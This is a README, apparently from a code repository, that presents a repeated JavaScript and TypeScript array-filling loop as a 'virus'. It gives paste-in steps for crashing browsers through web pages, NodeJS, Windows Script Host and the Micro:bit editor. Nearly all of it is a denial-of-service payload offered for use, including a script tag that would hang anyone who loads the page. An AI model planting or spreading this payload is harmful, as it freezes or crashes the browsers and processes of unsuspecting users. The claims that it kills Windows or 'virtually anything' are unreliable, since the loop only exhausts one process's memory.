# 99999
A JavaScript/TypeScript virus that will kill virtually anything


Platforms it has effect on:
* Google Chrome/Chromium-based browsers
* NodeJS
* Any version of Windows(via WSCRIPT.EXE)
* BBC Micro:bit(MakeCode Editor)
* Internet Explorer
* IEMode in Edge (kills IEChooser at the same time)


## Kill a webpage
Paste the JS code inside of a script tag.
```html
<script>
  function ohSnap() {
  var corruptable=[]
  for(var i=0;i<(9999999*999999999999999999999);i++) {
    corruptable.push(i);
    corruptable.push(i);
    corruptable.push(i);
    corruptable.push(i);
    corruptable.push(i);
    corruptable.push(i);
    corruptable.push(i);
    corruptable.push(i);
    corruptable.push(i);
    corruptable.push(i);
    corruptable.push(i);
  }
}

ohSnap()
</script>
```

## Kill a Windows96 instance
Create a WRT bin:
```js
//!wrt
function ohSnap() {
  var corruptable=[]
  for(var i=0;i<(9999999*999999999999999999999);i++) {
    corruptable.push(i);
    corruptable.push(i);
    corruptable.push(i);
    corruptable.push(i);
    corruptable.push(i);
    corruptable.push(i);
    corruptable.push(i);
    corruptable.push(i);
    corruptable.push(i);
    corruptable.push(i);
    corruptable.push(i);
  }
}

ohSnap()
```

## Kill the BBC Micro:bit
Open the makecode editor at https://makecode.microbit.org/, create a project, and paste the typescript in:
```ts
function ohSnap () {
    for (let i = 0; i <= (9999999 * 999999999999999999999) - 1; i++) {
        corruptable.push(i)
        corruptable.push(i)
        corruptable.push(i)
        corruptable.push(i)
        corruptable.push(i)
        corruptable.push(i)
        corruptable.push(i)
        corruptable.push(i)
        corruptable.push(i)
        corruptable.push(i)
        corruptable.push(i)
    }
}
let corruptable: number[] = []
corruptable = []
ohSnap()
```

## Killing NodeJS and Windows98+
The standalone JavaScript works well.
```js
function ohSnap() {
  var corruptable=[]
  for(var i=0;i<(9999999*999999999999999999999);i++) {
    corruptable.push(i);
    corruptable.push(i);
    corruptable.push(i);
    corruptable.push(i);
    corruptable.push(i);
    corruptable.push(i);
    corruptable.push(i);
    corruptable.push(i);
    corruptable.push(i);
    corruptable.push(i);
    corruptable.push(i);
  }
}

ohSnap()
```
Pasting it into NodeJS will result in NodeJS crashing.
If you're using a NodeJS Repl on [Replit](https://replit.com/), you might see text saying `The Repl proccess died unexpectedly`.
To Kill Windows98 or above, open the MS-DOS prompt. Make sure you have Windows Script Host by running WSCRIPT.EXE. If it shows WSH settings, close them and run `WSCRIPT.EXE path/to/99999.js`
